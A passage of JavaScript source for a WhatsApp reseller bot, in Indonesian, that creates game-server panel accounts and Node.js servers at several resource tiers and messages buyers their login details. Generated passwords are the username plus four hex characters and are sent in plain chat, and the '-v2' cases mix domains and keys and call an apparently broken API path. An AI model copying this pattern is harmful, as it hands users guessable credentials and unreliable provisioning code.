━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c2gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c3gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c3gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg"
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c4gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c4gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c5gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c5gb-v2": {

if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c6gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c6gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
